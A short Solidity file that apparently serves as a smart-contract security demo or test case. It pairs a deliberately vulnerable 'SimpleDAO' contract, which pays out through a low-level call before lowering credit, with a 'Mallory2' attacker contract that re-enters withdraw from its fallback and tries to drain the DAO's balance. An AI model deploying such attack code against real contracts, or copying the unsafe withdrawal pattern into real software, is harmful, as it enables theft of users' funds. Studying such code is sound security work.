pragma solidity >=0.4.0 <0.7.0;

contract SimpleDAO {
    mapping (address => uint256) public credit;
    bool flag = true;

    constructor() payable public {
        donate();
    }

    function donate() payable public{
        credit[msg.sender] += msg.value;
    }

    function withdraw(uint256 amount) public{
        require(flag, "Only one time call is allowed.");
        flag = false;
        if (credit[msg.sender]>= amount) {
            msg.sender.call.value(amount)("");
            credit[msg.sender]-=amount;
        }
    }

    function queryCredit(address to) public view returns (uint256) {
        return credit[to];
    }
}

contract Mallory2 {
  SimpleDAO public dao;
  address payable owner; 

  constructor(SimpleDAO addr) public payable{
    owner = msg.sender;
    dao = addr;
  }

  function attack() public payable{
    dao.donate.value(1)();
    dao.withdraw(1);
  }

  function getJackpot() public{
    dao.withdraw(address(dao).balance);
    owner.transfer(address(this).balance);
  }

  function() external payable{
       dao.withdraw(1);
  }
}
